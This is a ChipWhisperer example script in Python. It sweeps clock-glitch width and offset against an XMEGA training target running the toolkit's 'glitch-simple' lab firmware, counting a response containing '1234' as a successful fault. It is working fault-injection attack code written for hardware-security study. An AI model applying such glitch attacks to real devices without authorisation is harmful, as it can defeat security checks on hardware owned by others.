"""Example for scripting glitching of the XMEGA target using the chipwhisperer
tool. Similar to what the glitch explorer does. This script does not spawn a
gui, and uses the 4.0 api.
"""

from __future__ import print_function, division

import time
import logging
import os
from collections import namedtuple
import csv

import numpy as np

import chipwhisperer as cw
from scripting_utils import GlitchResultsDisplay


logging.basicConfig(level=logging.WARN)
scope = cw.scope()
target = cw.target(scope)

# setup parameters needed for glitch the XMEGA
scope.glitch.clk_src = 'clkgen'

scope.gain.gain = 45
scope.adc.samples = 3000
scope.adc.offset = 0
scope.adc.basic_mode = "rising_edge"
scope.clock.clkgen_freq = 7370000
scope.clock.adc_src = "clkgen_x4"
scope.trigger.triggers = "tio4"
scope.io.tio1 = "serial_rx"
scope.io.tio2 = "serial_tx"
scope.io.hs2 = "glitch"

sample_size = 10

import time
def reset_target(scope):
    scope.io.pdic = 'low'
    time.sleep(0.05)
    scope.io.pdic = 'high'

target.go_cmd = ""
target.key_cmd = ""

# program the XMEGA with the built hex file
prog = cw.programmers.XMEGAProgrammer
fw_path = "../../hardware/victims/firmware/glitch-simple/glitchsimple-CW303.hex"

cw.programTarget(scope, prog, fw_path)

# format output table
headers = ['width', 'offset', 'success rate', 'last response']
#glitch_display = GlitchResultsDisplay(headers)

# set glitch parameters
# trigger glitches with external trigger
scope.glitch.trigger_src = 'ext_single'
scope.glitch.repeat = 105

traces = []
outputs = []
widths = []
offsets = []

# named tuples to make it easier to change the scope of the test
Range = namedtuple('Range', ['min', 'max', 'step'])
width_range = Range(-10, 10, 1)
offset_range = Range(-10, 10, 1)

glitch_display = GlitchResultsDisplay(headers)
# glitch cycle
scope.glitch.width = width_range.min
target.init()
attack1_data = []
while scope.glitch.width < width_range.max:
    scope.glitch.offset = offset_range.min
    while scope.glitch.offset < offset_range.max:
        successes = 0
        for i in range(sample_size):
            # call before trace things here

            # flush the garbage from the computer's target read buffer
            target.ser.flush()

            # run aux stuff that should run before the scope arms here

            scope.arm()
            reset_target(scope)

            timeout = 50
            # wait for target to finish
            while target.isDone() is False and timeout:
                timeout -= 1
                time.sleep(0.01)

            try:
                ret = scope.capture()
                if ret:
                    print('Timeout happened during acquisition')
            except IOError as e:
                print('IOError: %s' % str(e))

            # get the results from the scope
            # read from the targets buffer
            num_chars = target.ser.inWaiting()
            response = target.ser.read(num_chars, timeout = 10)

            # for table display purposes
            success = '1234' in repr(response) # check for glitch success (depends on targets active firmware)
            if success:
                successes += 1

        data = [scope.glitch.width, scope.glitch.offset, successes/sample_size, repr(response)]
        attack1_data.append(data)
        # run aux stuff that should happen after trace here
        scope.glitch.offset += offset_range.step
    scope.glitch.width += width_range.step

def sort_glitch(glitch):
    return glitch[2]

attack1_data.sort(key=sort_glitch, reverse=True)
for row in attack1_data:
    print(row)

# the rest of the data is available with the outputs, widths, and offsets lists
print('Done')

# clean up the connection to the scope and target
scope.dis()
target.dis()
